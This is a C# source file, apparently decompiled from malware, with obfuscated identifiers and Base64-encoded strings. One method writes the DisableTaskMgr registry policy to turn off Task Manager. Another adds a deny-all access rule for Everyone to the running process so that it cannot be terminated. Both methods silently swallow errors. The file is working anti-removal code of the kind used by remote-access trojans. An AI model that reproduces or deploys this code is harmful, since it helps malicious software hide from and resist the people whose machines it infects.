using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace PbjBzLsVOvNrzQ;

internal class YgKGzAuqlliO
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr KrScEdyiDZX, int hfeLEyasrQZ, [Out] byte[] DOmMhpjUCSZ, uint VQHzKDnNlDU, out uint XbYoyPtpFKYB);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr MGlbelhWJkLiOB, int jBFhsjeyXOdk, [In] byte[] WFqzVYYLsz);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void mhHwBLVwexsQh(bool CPXtOELfXQJNL)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt"));
			registryKey.SetValue(oIxRFVSIpmRuMqIJ.PBGxcXGgCq("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor oJTlLCepDYSuejO(IntPtr dzVyHMmXBCoJaa)
	{
		byte[] dOmMhpjUCSZ = new byte[0];
		GetKernelObjectSecurity(dzVyHMmXBCoJaa, 4, dOmMhpjUCSZ, 0u, out var XbYoyPtpFKYB);
		if ((long)XbYoyPtpFKYB > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(dzVyHMmXBCoJaa, 4, dOmMhpjUCSZ = new byte[XbYoyPtpFKYB], XbYoyPtpFKYB, out XbYoyPtpFKYB))
		{
			return null;
		}
		return new RawSecurityDescriptor(dOmMhpjUCSZ, 0);
	}

	private void lbdvVQQwRIjdpqHn(IntPtr oqNhJzTvLJpM, RawSecurityDescriptor dOLHXzoxPklsCty)
	{
		byte[] array = new byte[dOLHXzoxPklsCty.BinaryLength];
		dOLHXzoxPklsCty.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(oqNhJzTvLJpM, 4, array);
	}

	public void bLXDJEhGwaNlI()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = oJTlLCepDYSuejO(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			lbdvVQQwRIjdpqHn(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
